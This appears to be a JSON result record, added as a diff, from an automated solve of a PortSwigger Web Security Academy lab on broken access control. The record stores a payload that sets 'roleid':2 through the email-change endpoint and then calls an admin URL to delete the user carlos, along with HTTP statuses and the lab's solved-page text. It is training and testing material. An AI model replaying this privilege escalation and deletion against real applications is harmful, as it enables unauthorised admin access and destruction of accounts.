@@ -1,0 +1,29 @@
+{
+  "labIndex": 20,
+  "category": "Broken Access Control",
+  "officialUrl": "https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile",
+  "technique": "Update de email com JSON incluindo roleid=2, acesso a /admin e exclusao de carlos",
+  "payload": "POST /my-account/change-email {\"roleid\":2}; GET /admin/delete?username=carlos",
+  "launch": {
+    "officialUrl": "https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile",
+    "url": "https://0ae100fc03ff82c2816016580039006b.web-security-academy.net/",
+    "base": "https://0ae100fc03ff82c2816016580039006b.web-security-academy.net",
+    "title": "User role can be modified in user profile",
+    "attempt": 1
+  },
+  "http": {
+    "updateStatus": 302,
+    "updateBody": "{\n  \"username\": \"wiener\",\n  \"email\": \"caleb1781523356224@example.com\",\n  \"apikey\": \"W3j69xKHgsDlU4S8KLLNq9bpbxbxzfdq\",\n  \"roleid\": 2\n}",
+    "adminStatus": 200,
+    "deleteStatus": 302
+  },
+  "instanceBase": "https://0ae100fc03ff82c2816016580039006b.web-security-academy.net",
+  "bannerText": "User role can be modified in user profile\nBack to lab description  \nLAB\n\nSolved",
+  "solved": true,
+  "statusClass": "widgetcontainer-lab-status is-solved",
+  "statusText": "LAB\n\nSolved",
+  "text": "User role can be modified in user profile\nBack to lab description  \nLAB\n\nSolved\n\nCongratulations, you solved the lab!\nShare your skills! \n \n Continue learning\nHome\n\n|\n\nMy account\nGiant Pillow Thing\n $5.27\nView details\nThe Trapster\n $99.06\nView details\nAbZorba Ball\n $86.22\nView details\nVintage Neck Defender\n $28.86\nView details\nEye Projectors\n $37.32\nView details\nZZZZZZ Bed - Your New Home Office\n $19.96\nView details\nPaint a rainbow\n $55.65\nView details\nAdult Space Hopper\n $2.67\nView details\nPortable Hat\n $88.80\nView details\nAll-in-One Typewriter\n $74.51\nView details\nCheshire Cat Grin\n $22.28\nView details\nEco Boat\n $62.70\nView details\nPoo Head - It's not just an insult anymore.\n $41.91\nView details\nFirst Impression Costumes\n $19.76\nView details\nPhotobomb Backdrops\n $44.20\nView details\nSix Pack Beer Belt\n $78.74\nView details\nMood Enhancer\n $18.40\nView details\nWhat Do You Meme?\n $35.53\nView details\nThe Trolley-ON\n $51.25\nView details\n3D Voice Assistants\n $93.04\nView details",
+  "title": "User role can be modified in user profile",
+  "url": "https://0ae100fc03ff82c2816016580039006b.web-security-academy.net/",
+  "evidenceScreenshot": "../screenshots/20-user-role-modified-in-profile-solved.png"
+}
